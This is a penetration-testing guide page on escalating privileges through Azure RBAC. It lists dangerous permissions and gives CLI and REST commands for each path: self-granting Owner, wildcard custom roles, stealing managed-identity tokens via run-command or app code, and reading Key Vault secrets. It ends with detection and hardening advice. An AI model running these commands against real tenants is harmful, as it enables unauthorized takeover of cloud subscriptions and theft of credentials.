---
cstg_id: CSTG-AZURE-RBAC-PRIVESC
title: "AZURE Rbac - Privilege Escalation"
provider: azure
service: rbac
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.Authorization/roleDefinitions/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/assign/action"
  - "Microsoft.Compute/virtualMachines/write"
  - "Microsoft.Compute/virtualMachines/runCommand/action"
  - "Microsoft.Compute/virtualMachines/extensions/write"
  - "Microsoft.Web/sites/write"
  - "Microsoft.Automation/automationAccounts/runbooks/write"
  - "Microsoft.KeyVault/vaults/accessPolicies/write"
  - "Microsoft.KeyVault/vaults/secrets/read (data plane)"
references:
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/custom-roles"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview"
  - "https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide"
  - "https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-privilege-escalation-via-cloud-shell/"
  - "https://hackingthe.cloud/azure/"
  - "https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create"
license: CC BY-SA 4.0
---

## Summary

This page enumerates privilege-escalation paths within Azure Role-Based Access Control (RBAC). The objective is to move from an initially compromised principal (assumed breach) to a higher-privileged principal — ideally Owner or User Access Administrator at a subscription or management-group scope, or control of a Global-Administrator-linked identity — by abusing a permission the compromised principal legitimately holds.

Azure RBAC privilege escalation almost always reduces to one of three patterns: (1) **directly granting yourself a more powerful role** (you can write role assignments or role definitions); (2) **borrowing a more powerful identity** (you can attach, run code on, or read credentials of a resource that carries a privileged managed identity or stored secret); or (3) **exploiting inheritance/transitivity** (a write capability at a parent scope, or membership manipulation, expands effective access). Each `### <permission>` subsection below isolates one primitive, the role(s) that confer it, and the exact path to Owner-equivalent control.

The enumeration that surfaces these primitives is described in [azure-rbac-enum.md](../02-services/azure-rbac-enum.md).

## Prerequisites

An authenticated foothold as any principal (user, service principal, or managed identity) that holds at least one of the escalation primitives below at some scope. No specific built-in role is assumed; the paths are organized by the *granular permission* that enables them, because over-broad custom roles frequently grant a single dangerous action without granting Owner.

The assessor needs a valid ARM access token (interactive sign-in, a service-principal secret/certificate, a managed-identity token from the instance metadata service, or a Cloud Shell session). Determine the starting effective-permission set first:

```bash
az account show
az role assignment list --assignee <objectId> --all -o json
# Resolve what each assigned role can actually do:
az role definition list --name "<roleName>" --query "[].permissions"
```

## Enumeration

Identify which escalation primitives the current principal possesses. The relevant Actions to search for across the principal's effective role definitions:

```bash
# Pull every role definition the principal holds and grep for dangerous actions
az role assignment list --assignee <objectId> --all \
  --query "[].roleDefinitionName" -o tsv | sort -u

# For each role, inspect Actions/DataActions for escalation primitives:
az role definition list --name "<roleName>" \
  --query "[].permissions[].{actions:actions, dataActions:dataActions}"
```

Flag the presence of any of: `Microsoft.Authorization/roleAssignments/write`, `Microsoft.Authorization/roleDefinitions/write`, `Microsoft.Authorization/*/write`, `*` (wildcard), `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`, `Microsoft.Compute/virtualMachines/write`, `.../runCommand/action`, `.../extensions/write`, `Microsoft.Web/sites/write`, `Microsoft.Automation/automationAccounts/runbooks/write`, and `Microsoft.KeyVault/vaults/accessPolicies/write`. Note the **scope** of each — the escalation only reaches as high as the scope where the action is held (with inheritance flowing downward).

## Misconfigurations & Findings

- A non-Owner role that nonetheless includes `Microsoft.Authorization/roleAssignments/write` or `roleDefinitions/write` — these are owner-equivalent in effect.
- Custom roles using wildcard `Actions` (`*` or `Microsoft.Authorization/*`) but named to sound limited.
- Privileged **managed identities** attached to compute/web/automation resources that lower-privileged principals can modify or execute code on.
- Service-principal credentials (secrets/certs) reachable from a Key Vault the principal can read or whose access policy it can edit.
- Standing high-value roles (no PIM), enabling immediate rather than time-bound abuse.
- Write access at a **parent scope** (management group / subscription) that inherits to all children.

## Exploitation

### Microsoft.Authorization/roleAssignments/write

This is the canonical direct-escalation primitive, held by **Owner** and **User Access Administrator**, and dangerously sometimes by custom roles. A principal with this action can create a role assignment granting *itself* (or a principal it controls) the Owner role at any scope at or below where the action is held.

```bash
# Grant self Owner at subscription scope
az role assignment create \
  --assignee <my-objectId> \
  --role "Owner" \
  --scope /subscriptions/<subId>
```

Raw ARM:

```http
PUT https://management.azure.com/subscriptions/{subId}/providers/Microsoft.Authorization/roleAssignments/{newGuid}?api-version=2022-04-01
{ "properties": { "roleDefinitionId": ".../Owner", "principalId": "<my-objectId>" } }
```

Result: full control of the scope. This is the highest-value path; if present, it short-circuits all others.

### Microsoft.Authorization/roleDefinitions/write

Allows creating or editing **custom role definitions**. The assessor crafts a custom role containing `*` (or specifically `Microsoft.Authorization/roleAssignments/write`), then — if they can also assign it — assigns it to themselves. Even without assignment rights, editing an existing role they already hold to add dangerous actions escalates them.

```bash
# Create a privileged custom role
az role definition create --role-definition '{
  "Name": "support-helper",
  "Actions": ["*"],
  "AssignableScopes": ["/subscriptions/<subId>"]
}'
# Then (if roleAssignments/write is also held) assign it, or edit a role already held
az role definition update --role-definition '{ ... add "Microsoft.Authorization/roleAssignments/write" ... }'
```

### Microsoft.ManagedIdentity/userAssignedIdentities/assign/action

Permits attaching a **user-assigned managed identity** to a resource. If a more privileged managed identity exists, the assessor attaches it to a resource they can run code on (VM, Function, Container) and then requests that identity's ARM token from the instance metadata service, inheriting its roles.

```bash
az vm identity assign --name <vm> --resource-group <rg> --identities <privileged-uami-resourceId>
# On the VM, mint the identity's token:
curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Microsoft.Compute/virtualMachines/write and runCommand/action and extensions/write

Any of these lets the assessor execute code in the security context of a VM, thereby stealing the VM's **system-assigned or attached managed-identity** token. `runCommand` and custom-script `extensions` execute as SYSTEM/root without needing existing OS credentials.

```bash
# Execute arbitrary commands on the VM (runs as SYSTEM/root)
az vm run-command invoke --name <vm> --resource-group <rg> \
  --command-id RunShellScript \
  --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
```

If the VM's managed identity holds Contributor/Owner, the stolen token grants that access. `virtualMachines/write` additionally allows attaching a privileged user-assigned identity before execution.

### Microsoft.Web/sites/write

Lets the assessor modify an App Service / Function App and deploy code that runs with the app's managed identity, then mint that identity's token via the App Service IDENTITY_ENDPOINT / IDENTITY_HEADER environment variables.

```bash
# Deployed app code reads:
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

### Microsoft.Automation/automationAccounts/runbooks/write

Automation Accounts carry a **Run As account** (service principal) or managed identity, historically often Contributor on the subscription. Writing and running a runbook executes in that privileged context.

```bash
az automation runbook create --automation-account-name <aa> --resource-group <rg> \
  --name pwn --type PowerShell
# Publish + start a runbook that mints the automation identity's ARM token
```

### Microsoft.KeyVault/vaults/accessPolicies/write (and data-plane secrets/read)

If service-principal credentials, certificates, or connection strings are stored in Key Vault, a principal that can grant itself a vault access policy (or already holds **Key Vault Secrets User** / RBAC data access) can read them and authenticate as that more privileged service principal.

```bash
az keyvault set-policy --name <kv> --object-id <my-objectId> --secret-permissions get list
az keyvault secret show --vault-name <kv> --name <sp-credential>
```

### Scope inheritance and group/PIM abuse

A write primitive held at a **management group** or **subscription** scope inherits to every child, maximizing blast radius — always assign or abuse at the highest scope where the action is held. If the principal can manage **group membership** of a privileged group (`Microsoft.Authorization` is not required; this is a directory operation), adding itself grants the group's transitive role assignments. Where PIM exists, abuse of an **eligible** assignment via self-activation is also a path if approval gates are absent.

## Detection & Logging

- **Azure Activity Logs** record every escalation write: `Microsoft.Authorization/roleAssignments/write` (Create role assignment), `Microsoft.Authorization/roleDefinitions/write` (Create/Update custom role), `Microsoft.Compute/virtualMachines/runCommand/action`, `.../extensions/write`, `Microsoft.Web/sites/write`, automation runbook create/publish/start, and `Microsoft.KeyVault/vaults/accessPolicies/write`. A role assignment whose `principalId` equals the caller is a strong self-elevation signal.
- **Microsoft Entra ID audit logs** record directory-side changes such as adding a member to a privileged group, creating/adding service-principal credentials, and PIM role activations; **sign-in logs** show the use of managed-identity and service-principal tokens (correlate unusual IPs / sudden ARM access by a workload identity).
- Managed-identity token requests to `169.254.169.254` are not logged by Azure directly, but the *use* of the resulting token (the subsequent ARM writes) is captured in Activity Logs under the managed identity's object ID — an identity that normally never writes role assignments suddenly doing so is anomalous.
- Managed detections: **Microsoft Defender for Cloud** and **Microsoft Sentinel** ship analytics for suspicious role-assignment creation, custom-role changes, run-command execution, and Key Vault access-policy modification. Alert on Owner/UAA grants outside change windows and on self-assignments.

## Remediation & Hardening

- Restrict `Microsoft.Authorization/roleAssignments/write` and `roleDefinitions/write` to a tiny, audited set of principals; never include them in general-purpose custom roles.
- Audit and remove **wildcard** custom roles; review `AssignableScopes` to limit blast radius.
- Use **PIM** for Owner/UAA and other high-value roles — make them eligible, time-bound, MFA- and approval-gated; eliminate standing privilege.
- Apply **least privilege to managed identities and Run As accounts**; scope them to resource groups, not subscriptions; migrate Automation Run As to managed identities and decommission unused ones.
- Lock down compute escalation: restrict `runCommand`, `extensions/write`, and `virtualMachines/write` to operational roles; monitor their use.
- Use **Key Vault RBAC** (not legacy access policies) and restrict `accessPolicies/write`; rotate any secrets that should not be standing credentials.
- Protect privileged **group membership** with access reviews and restricted membership management; enable Conditional Access requiring MFA / compliant devices for privileged operations.
- Stream Activity, Entra audit, and sign-in logs to Sentinel with analytics rules for the writes listed above.

## Tools

- **Azure CLI / Azure PowerShell** for executing role-assignment, role-definition, identity-assign, run-command, and Key Vault operations.
- **Instance Metadata Service / App Service identity endpoint** clients for minting managed-identity tokens.
- **Azure Resource Graph** to locate privileged managed identities, Run As accounts, and writable resources at scale.
- **RBAC escalation-path analysis tooling** that consumes the effective-access graph (see the enumeration page) and computes reachable Owner/UAA paths.
- **Microsoft Graph API** clients for directory-side membership and credential operations.

## References

- Role assignments — https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments
- Custom roles — https://learn.microsoft.com/en-us/azure/role-based-access-control/custom-roles
- Built-in roles — https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles
- Managed identities overview — https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
- VM Run Command overview — https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview
- Key Vault RBAC guide — https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide
- Role Assignments Create REST API — https://learn.microsoft.com/en-us/rest/api/authorization/role-assignments/create
- Azure privilege escalation research (NetSPI) — https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-privilege-escalation-via-cloud-shell/
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/
